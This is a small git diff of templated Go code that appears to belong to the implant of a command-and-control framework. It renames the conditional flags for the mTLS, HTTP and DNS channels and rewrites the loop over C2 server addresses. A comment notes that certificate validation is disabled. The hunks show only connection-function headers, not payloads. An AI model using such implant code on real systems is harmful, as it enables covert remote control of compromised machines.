@@ -6,9 +6,8 @@ import (
 
 	// {{if .HTTPc2Enabled}}
 	"net"
-	"net/url"
-
 	// {{end}}
+	"net/url"
 
 	// {{if .Debug}}
 	"log"
@@ -161,9 +160,9 @@ func StartConnectionLoop() *Connection {
 }
 
 var ccServers = []string{
-	// {{ range _, $value := .C2 }}
-	"{{$value}}",
-	// {{ end }}
+	// {{range $index, $value := .C2}}
+	"{{$value}}", // {{$index}}
+	// {{end}}
 }
 
 func nextCCServer() *url.URL {
@@ -191,7 +190,7 @@ func getMaxConnectionErrors() int {
 	return maxConnectionErrors
 }
 
-// {{if .MTLSServer}}
+// {{if .MTLSc2Enabled}}
 func mtlsConnect(uri *url.URL) (*Connection, error) {
 	// {{if .Debug}}
 	log.Printf("Connecting -> %s", uri.Host)
@@ -248,9 +247,9 @@ func mtlsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -MTLSServer
+// {{end}} -MTLSc2Enabled
 
-// {{if .HTTPServer}}
+// {{if .HTTPc2Enabled}}
 func httpConnect(uri *url.URL) (*Connection, error) {
 
 	// {{if .Debug}}
@@ -340,9 +339,9 @@ func httpConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} -HTTPServer
+// {{end}} -HTTPc2Enabled
 
-// {{if .DNSParent}}
+// {{if .DNSc2Enabled}}
 func dnsConnect(uri *url.URL) (*Connection, error) {
 	dnsParent := uri.Hostname()
 	// {{if .Debug}}
@@ -391,7 +390,7 @@ func dnsConnect(uri *url.URL) (*Connection, error) {
 	return connection, nil
 }
 
-// {{end}} - DNSParent
+// {{end}} - .DNSc2Enabled
 
 // rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
 // we have to disable all of the fucking certificate validation and re-implement everything.
